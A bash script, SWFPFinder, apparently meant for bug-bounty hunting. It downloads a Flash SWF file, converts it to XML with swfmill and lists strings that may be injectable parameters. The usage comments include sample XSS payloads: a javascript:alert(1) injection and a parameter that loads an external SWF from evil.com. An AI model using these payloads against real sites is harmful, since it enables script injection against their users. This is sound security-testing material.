#!/bin/bash
#
# SWFPFinder - SWF Potential Parameters Finder
# by M'hamed Outaadi (@m4ll0k)
# 
# SWFPFinder is a simple and open source bash script designed to discovery the potential swf (file) parameters on the webapp analysing the swf file. 
# SWFPFinder use swfmill tool, swfmill is a tool to process Adobe Flash (SWF) files. It can convert SWF from and to an XML dialect called “swfml”, 
# which is closely modeled after the SWF file format.

# Requirements
# for linux: apt-get install swfmill
# for macos: brew install swfmill

# Usage:
# this tool you can use it during bug hunting for find a potential swf parameters..

# $ bash swfpfinder.sh https://hackerone-target.com/hackme.swf
#   load_external-swf-file
#   inject-me
#   blabla
#   ...

# after find potential parameters:

#  https://hackerone-target.com/hackme.swf?inject-me=javascript:alert(1) 
#  https://hackerone-target.com/hackme.swf?load_external-swf-file=https://www.evil.com/xss.swf

function setup(){
	swfmill=$(which swfmill)
	if [[ "$?" != '0' ]]
	then 
		echo "Need install swfmill.. "
		if [[ $(uname -s) == "Darwin" ]]
		then
			echo "Installing swfmill.."
			brew install swfmill
		elif [[ $(uname -s) == "Linux" ]]
		then
			echo "Installing swfmill.."
			apt-get install swfmill
		else
			echo "System not supported!"
			exit 1
		fi
	fi
	echo "swfmill installed.. continue.."

}

function main(){
	rand_hex_string=$(openssl rand -hex 32)
	tmp_dir="/tmp"
	tmp_file_swf="$tmp_dir/$rand_hex_string.swf"
	tmp_file_xml="$tmp_dir/$rand_hex_string.xml"
	_tmp=$(wget "$1" -O $tmp_file_swf &>/dev/null)
	swfmill swf2xml $tmp_file_swf $tmp_file_xml
	cat $tmp_file_xml|grep -iEo '<String2 value="[a-zA-Z0-9_-]+"'|tr '"' ' ' |awk '{print $3}'
	
}
if [[ $1 == '' ]] 
then
	echo "-- ==[ SWF Potential Parameter Finder ]== --"
	echo -e "\tby M'hamed Outaadi (@m4ll0k)"
	echo "Usage: "
	echo -e "\tbash $0 URL"
	echo -e "\te.g: https://www.example.com/test.swf"
	exit 1
fi
setup
clear
main $1
